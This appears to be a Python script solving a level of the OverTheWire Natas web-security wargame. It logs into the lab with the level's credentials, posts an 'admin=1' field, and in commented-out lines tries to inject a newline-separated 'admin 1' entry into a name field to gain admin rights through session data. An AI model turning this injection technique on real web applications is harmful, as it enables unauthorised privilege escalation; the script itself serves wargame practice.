#!/usr/bin/python3
# Time: 2019/04/23 3:15 PM

import re
import time
import requests
import base64
import codecs



"""  
感觉是 数据注入

"""

username = 'natas21'
password = 'IFekPyrQXftziDEsUr3x21sYuahypdgJ'
url = f'http://{username}.natas.labs.overthewire.org/?debug=true'
# url = f'http://{username}.natas.labs.overthewire.org/'
s = requests.Session()


resp = s.post(url, auth=(username, password), data={"admin": 1})
print(resp.text)
print("**"*40)
print(s.cookies)

# resp = s.post(url, auth=(username, password), data={"name": "justice\nadmin 1"})
# print(resp.text)
# print("**"*40)
#
# resp = s.get(url, auth=(username, password), data={"name": "justice"})
# print(resp.text)
# print("**"*40)


# 7gm1a7bbpmvtnru3f1sq8phhk7
# faib16jblcp2lgs2l1qsl76s81
# il61qtmp93rlf5emcr8u6ohqk0